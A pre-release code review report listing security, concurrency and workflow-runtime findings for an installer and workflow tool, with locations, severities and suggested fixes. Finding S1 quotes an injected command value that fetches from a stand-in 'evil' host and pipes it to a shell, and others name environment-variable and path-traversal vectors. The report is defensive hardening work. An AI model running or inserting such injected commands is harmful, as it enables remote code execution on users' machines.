# Pre-v4.0 Code Review Findings (2026-06-04)

6 parallel read-only reviewers over ~120 src files (manifest+security, installers,
workflow runtime, checkpoint+state+discipline, uninstallers+audit+cli). Low-risk
scatter files (i18n, types, schemas, render/parse helpers) skipped per user.

P0 (data-loss, threat-model-independent) FIXED in v4.1.3. Remainder tracked below.

## P1 — Security hardening (threat-model-gated: manifests are repo-controlled today)

| # | Sev | Location | Issue |
|---|-----|----------|-------|
| S1 | BLOCKER | `spawn.ts:114,121` + `security.ts:38-56` | Shell-injection blocklist only rejects `$( ${ \``; misses `; \| & && > < \n ( ) { }` etc. `cmd` runs via `cmd.exe /c` / `/bin/sh -c`. `cmd: 'npm i pkg; curl evil\|sh'` passes. Real fix: drop the shell — explicit-argv `spawn` (mcp/cc-plugin installers already do this; npm-cli/verify/uninstall don't). |
| S2 | BLOCKER | `spawn.ts:106` + spec env schema | `install.env` values never screened, injected into shell env. `$FOO` / `LD_PRELOAD` / `BASH_ENV` / `IFS` attacker-controllable. Screen env keys+values, or pass to non-shell spawn. |
| S3 | HIGH | `security.ts:124` | `cc-hook-add` `hook_command` unscreened → written to settings.json, runs every SessionStart/PreToolUse (persistent, unattended — worse than install.cmd). Add to screened paths. |
| S4 | HIGH | `security.ts:124` | Gate path-walks a fixed list (fail-open). New cmd-bearing fields silently unscreened. Make fail-closed: recursive scalar walk OR schema-driven. |
| S5 | HIGH | `exprBuilder.ts:9-20` | expr-eval sandbox incomplete: `allowMemberAccess` not set false, functions (map/filter/fold) callable. Safe ONLY because gate exprs are maintainer yaml. Add function-call token guard OR tighten the "locked-down" comment to state the trust assumption. |
| S6 | MEDIUM | `path-guard.ts:9-16` | Blocklist misses absolute paths / UNC / Unicode dot encodings; not applied to cleanup_paths/cwd. Replace with canonicalize-then-confine (`resolve` + `startsWith(root)`). |
| S7 | MEDIUM | `validate.ts:55` + `index.ts:33` | `cc-hook` type / `hook` install_type have no allOf-matrix or INSTALL_TYPE_METHODS entry → `type:cc-hook` + `method:npm-cli` may validate (fail-open cross-field). |
| S8 | MEDIUM | `aliases.ts:15`, `knownGood.ts:14` | Trust files read from `process.cwd()` — attacker-controlled if run from hostile dir. Anchor to package root. |
| S9 | LOW | `npmCli.ts:34` | Win path routes `npm uninstall -g <pkg>` through `cmd.exe` unquoted (POSIX uses shell:false). Validate pkg `/^(@[\w.-]+\/)?[\w.-]+$/`. |
| S10 | LOW | `spawn.ts:143` | Timeout error echoes full `cmd` (secret leak) — inconsistent with path-guard.ts D-08 no-echo posture. |

## P2 — Concurrency / robustness (checkpoint reviewer)

| # | Sev | Location | Issue |
|---|-----|----------|-------|
| C1 | HIGH | `sigintTrap.ts:29` | Async lock acquire inside SIGINT handler can deadlock vs the main thread's own in-flight write; lock-contention throw downgrades exit 130→1. Make pause-on-SIGINT lock-free (dedicated `paused-<ts>.json`). |
| C2 | MEDIUM | `before-commit.ts:36` | yaml-load failure throws BEFORE the no-skip-hooks / no-push checks run → fail-OPEN on the security-relevant gates. Move those checks before `loadDiscipline`, or fail-closed. |
| C3 | MEDIUM | `before-commit.ts:28` | `execSync(auto_fix_cmd)` runs yaml-sourced command, no try/catch → raw stack on failure; command-injection surface if yaml ever attacker-influenced. |
| C4 | MEDIUM | `state.ts:30-36` | Stale-lock threshold (10s) < SIGINT write timeout (30s); a slow-but-alive write can have its lock stolen. Add `onCompromised` handler. |
| C5 | MEDIUM | `state.ts:127-136` | `pause()`/`complete()` read-modify-write — only the write is locked, not the read → lost-update between concurrent pause/complete. Lock the full RMW. |
| C6 | MEDIUM | `archive.ts:25` | Unbounded growth, no rotation/cap/TTL. Add retention (keep last N per phase). Same for `audit/log.ts` (no gc-equivalent). |
| C7 | MEDIUM | `ccHookAdd.ts:56` (uninstall) | Reverse-merge can remove a user's identical hook + unconditionally rewrites settings.json (destroys formatting even on no-op). Tag harness-installed hooks; skip write when nothing removed. |
| C8 | LOW | `sigintTrap.ts:11` | Double `registerSigintTrap` stacks listeners → first Ctrl-C becomes force-quit. Register once / `process.once`. |

## Workflow-runtime findings (mostly clean; fail-soft consistent)

| # | Sev | Location | Issue |
|---|-----|----------|-------|
| W1 | MEDIUM | `run.ts:361` | `JSON.parse(envelopeJson)` outside the try/catch → a non-JSON spawn stub throw escapes the ADR-0029 fail-soft. Wrap it. |
| W2 | MEDIUM | `masterOrchestrator.ts:199-208` | Rejected parallel subs silently dropped (no warn) vs serial path. Add `else` warn on rejected settlements. |
| W3 | MEDIUM | `masterOrchestrator-helpers.ts:61` | Path-B no-op fallback → a fully-failed sub reported in `fired[]`. `fired` not a reliable completion signal. |
| W4 | LOW | `run.ts:373` | Single-shot completion `|| subtype==='success'` is more lenient than ralphLoop `isComplete` (requires BOTH). Align or document. |
| W5 | LOW | `run.ts:283` / `ralphLoop.ts:42` | `NaN` / `maxIter<=0` → misleading MaxIterationsExceededError. Guard `Number.isFinite` / `< 1`. |

## Clean dimensions (no action)

mcp installers (argv-mode), judgmentResolver (4-level ref + dual-schema + cache),
governance veto (fail-soft), schema strictness (additionalProperties:false everywhere),
doctor checks (read-only argv spawn), status/backup-list/resume (graceful degrade),
audit redaction ordering (redact before any output incl. jq), interpolate (fail-loud
strict vars), promiseExtract, prototype-pollution (Ajv/TypeBox reject __proto__).
